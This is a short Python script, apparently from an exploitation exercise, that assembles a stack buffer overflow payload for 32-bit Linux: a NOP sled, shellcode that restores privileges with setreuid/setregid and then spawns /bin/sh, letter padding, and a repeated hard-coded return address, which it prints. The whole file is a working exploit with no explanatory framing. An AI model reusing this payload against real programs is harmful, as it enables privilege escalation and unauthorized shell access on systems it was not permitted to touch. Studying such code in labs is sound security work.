import struct


nop_slide = ('\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
)
                

shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
            +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
            +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
            +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
            +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
            +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
            +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')

# Define the alphabet
alphabet = 'ABCDEFGHIJK'

# Initialize an empty string to store the result
padding = ''

# Repeat each letter 10 times and concatenate to the result string
for letter in alphabet:
    padding += letter * 10

#address = struct.pack("I", 0xbffffa54).decode("latin-1")
address = 'T\xfa\xff\xbf' * 20

payload = nop_slide + shellcode + padding + address

print(payload)



